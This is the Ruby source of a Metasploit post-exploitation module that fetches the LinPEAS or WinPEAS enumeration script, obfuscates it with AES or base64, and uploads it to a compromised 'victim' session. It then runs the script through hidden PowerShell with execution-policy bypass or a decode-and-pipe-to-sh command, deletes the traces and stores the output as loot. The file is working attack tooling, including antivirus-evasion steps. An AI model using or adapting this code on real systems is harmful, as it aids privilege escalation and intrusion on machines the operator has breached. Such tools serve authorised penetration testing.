##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'
require 'net/http'
require 'base64'
require 'openssl'
require 'tempfile'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi PEASS launcher',
      'Description'    => %q{
          This module will launch the indicated PEASS (Privilege Escalation Awesome Script Suite) script to enumerate the system.
          You need to indicate the URL or local path to LinPEAS if you are in some Unix or to WinPEAS if you are in Windows.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Carlos Polop <@carlospolopm>'
        ],
      'Platform'       => %w{ bsd linux osx unix win },
      'SessionTypes'   => ['shell', 'meterpreter'],
      'References' =>
          [
            ['URL', 'https://github.com/carlospolop/PEASS-ng'],
            ['URL', 'https://www.youtube.com/watch?v=9_fJv_weLU0'],
          ]
    ))
    register_options(
      [
        OptString.new('URL', [true, 'Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Linpeas: https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh', "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe"]),
        OptString.new('PASSWORD', [false, 'Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used.', rand(36**32).to_s(36)]),
        OptString.new('TEMP_DIR', [false, 'Path to upload the obfuscated PEASS script. By default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp" in Unix.', '']),
        OptString.new('PARAMETERS', [false, 'Parameters to pass to the script', nil]),
        OptString.new('TIMEOUT', [false, 'Timeout of the execution of the PEASS script (15min by default)', 15*60])
      ])
  end

  def run
    ps_var1 = rand(36**5).to_s(36) #Winpeas PS needed variable

    # Load PEASS script in memory
    peass_script = load_peass()
    print_good("PEASS script successfully retreived.")

    # Obfuscate loaded PEASS script
    if datastore["PASSWORD"].length > 1
      # If no Windows, check if openssl exists
      if !session.platform.include?("win")
        openssl_path = cmd_exec("command -v openssl")
        raise 'openssl not found in victim, unset the password of the module!' unless openssl_path.include?("openssl")
      end

      # Get encrypted PEASS script in B64
      print_status("Encrypting PEASS and encoding it in Base64...")
      
      # Needed code to decrypt from unix
      if !session.platform.include?("win")
        aes_enc_peass_ret = aes_enc_peass(peass_script)
        peass_script_64 = aes_enc_peass_ret["encrypted"]
        key_hex = aes_enc_peass_ret["key_hex"]
        iv_hex = aes_enc_peass_ret["iv_hex"]
        decode_linpeass_cmd = "openssl aes-256-cbc -base64 -d -K #{key_hex} -iv #{iv_hex}"
      
      # Needed code to decrypt from Windows
      else
        # As the PS function is only capable of decrypting readable strings
        # in Windows we encrypt the B64 of the binary and then load it in memory 
        # from the initial B64. Then: original -> B64 -> encrypt -> B64
        aes_enc_peass_ret = aes_enc_peass(Base64.encode64(peass_script)) #Base64 before encrypting it
        peass_script_64 = aes_enc_peass_ret["encrypted"]
        key_b64 = aes_enc_peass_ret["key_b64"]
        iv_b64 = aes_enc_peass_ret["iv_b64"]
        load_winpeas = get_ps_aes_decr()
        
        ps_var2 = rand(36**6).to_s(36)
        load_winpeas += "$#{ps_var2} = DecryptStringFromBytesAes \"#{key_b64}\" \"#{iv_b64}\" $#{ps_var1};"
        load_winpeas += "$#{rand(36**7).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var2}));"
      end
    
    else
      # If no Windows, check if base64 exists
      if !session.platform.include?("win")
        openssl_path = cmd_exec("command -v base64")
        raise 'base64 not found in victim, set a 32B length password!' unless openssl_path.include?("base64")
      end

      # Encode PEASS script
      print_status("Encoding PEASS in Base64...")
      peass_script_64 = Base64.encode64(peass_script)

      # Needed code to decode it in Unix and Windows
      decode_linpeass_cmd = "base64 -d"
      load_winpeas = "$#{rand(36**6).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var1}));"
    
    end

    # Write obfuscated PEASS to a local file
    file = Tempfile.new('peass_metasploit')
    file.write(peass_script_64)
    file.rewind

    # Upload file to victim
    temp_peass_name = rand(36**5).to_s(36)
    if datastore["TEMP_DIR"] != ""
      temp_path = datastore["TEMP_DIR"]
      if temp_path[0] == "/"
        temp_path = temp_path + "/#{temp_peass_name}"
      else
        temp_path = temp_path + "\\#{temp_peass_name}"
      end
    
    elsif session.platform.include?("win")
      temp_path = "C:\\Windows\\System32\\spool\\drivers\\color\\#{temp_peass_name}"
    else
      temp_path = "/tmp/#{temp_peass_name}"
    end
    
    print_status("Uploading obfuscated peass to #{temp_path}...")
    upload_file(temp_path, file.path)
    print_good("Uploaded")
    
    # Run PEASS script
    begin
      tmpout = "\n"
      print_status "Running PEASS..."

      # If Windows, suppose Winpeas was loaded
      if session.platform.include?("win")
        cmd = "$#{ps_var1} = Get-Content -Path #{temp_path};"
        cmd += load_winpeas
        cmd += "$a = [winPEAS.Program]::Main(\"#{datastore['PARAMETERS']}\");"
        cmd += "del #{temp_path};"
        
        # Transform to Base64 in UTF-16LE format
        cmd_utf16le = cmd.encode("utf-16le")
        cmd_utf16le_b64 = Base64.encode64(cmd_utf16le).gsub(/\r?\n/, "")
        tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"])
      
        # If unix, then, suppose linpeas was loaded
      else
        tmpout << cmd_exec("cat #{temp_path} | #{decode_linpeass_cmd} | sh -s -- #{datastore['PARAMETERS']}; rm #{temp_path}", args=nil, time_out=datastore["TIMEOUT"])
      end

      print "\n#{tmpout}\n\n"
      command_log = store_loot("PEASS", "text/plain", session, tmpout, "peass.txt", "PEASS script execution")
      print_good("PEASS output saved to: #{command_log}")
    
    rescue ::Exception => e
      print_bad("Error Running PEASS: #{e.class} #{e}")
    end
    
    # Close and delete the temporary file
    file.close
    file.unlink
  end

  def load_peass
    # Load the PEASS script from a local file or from Internet
    peass_script = ""
    url_peass = datastore['URL']
    
    if url_peass.include?("http://") || url_peass.include?("https://")
      target = URI.parse url_peass
      raise 'Invalid URL' unless target.scheme =~ /https?/
      raise 'Invalid URL' if target.host.to_s.eql? ''
      
      res = Net::HTTP.get_response(target)
      peass_script = res.body

      raise "Something failed downloading PEASS script from #{url_peass}" if peass_script.length < 500

    else
      raise "PEASS local file (#{url_peass}) does not exist!" unless ::File.exist?(url_peass)        
      peass_script = File.read(url_peass)
      raise "Something falied reading PEASS script from #{url_peass}" if peass_script.length < 500
    end

    return peass_script
  end

  def aes_enc_peass(peass_script)
    # Encrypt the PEASS script with aes
    key = datastore["PASSWORD"]
    iv = OpenSSL::Cipher::Cipher.new('aes-256-cbc').random_iv
    
    c = OpenSSL::Cipher.new('aes-256-cbc').encrypt
    c.iv = iv
    c.key = key
    encrypted = c.update(peass_script) + c.final
    encrypted = [encrypted].pack('m')

    return {
      "encrypted" => encrypted,
      "key_hex" => key.unpack('H*').first,
      "key_b64" => Base64.encode64(key).strip,
      "iv_hex" => iv.unpack('H*').first,
      "iv_b64" => Base64.encode64(iv).strip
    }
  end

  def get_ps_aes_decr
    # PS code to decrypt Winpeas
    return '# Taken from https://gist.github.com/Darryl-G/d1039c2407262cb6d735c3e7a730ee86
function DecryptStringFromBytesAes([String] $key, [String] $iv, [String] $encrypted) {
    [byte[]] $encrypted = [Convert]::FromBase64String($encrypted);
    [byte[]] $key = [Convert]::FromBase64String($key)
    [byte[]] $iv = [Convert]::FromBase64String($iv)

    # Declare the stream used to encrypt to an in memory
    # array of bytes.
    [System.IO.MemoryStream] $msDecrypt

    # Declare the RijndaelManaged object
    # used to encrypt the data.
    [System.Security.Cryptography.RijndaelManaged] $aesAlg = new-Object System.Security.Cryptography.RijndaelManaged

    [String] $plainText=""

    try  {
        # Create a RijndaelManaged object
        # with the specified key and IV.
        $aesAlg =  new-object System.Security.Cryptography.RijndaelManaged
        $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesAlg.KeySize = 256
        $aesAlg.BlockSize = 128
        $aesAlg.key = $key
        $aesAlg.IV = $iv

        # Create an encryptor to perform the stream transform.
        [System.Security.Cryptography.ICryptoTransform] $decryptor = $aesAlg.CreateDecryptor($aesAlg.Key, $aesAlg.IV);

        # Create the streams used for encryption.
        $msDecrypt = new-Object System.IO.MemoryStream @(,$encrypted)
        $csDecrypt = new-object System.Security.Cryptography.CryptoStream($msDecrypt, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $srDecrypt = new-object System.IO.StreamReader($csDecrypt)

        #Write all data to the stream.
        $plainText = $srDecrypt.ReadToEnd()
        $srDecrypt.Close()
        $csDecrypt.Close()
        $msDecrypt.Close()
    }
    finally {
        # Clear the RijndaelManaged object.
        if ($aesAlg -ne $null){
            $aesAlg.Clear()
        }
    }

    # Return the Decrypted bytes from the memory stream.
    return $plainText
}
'
  end
end
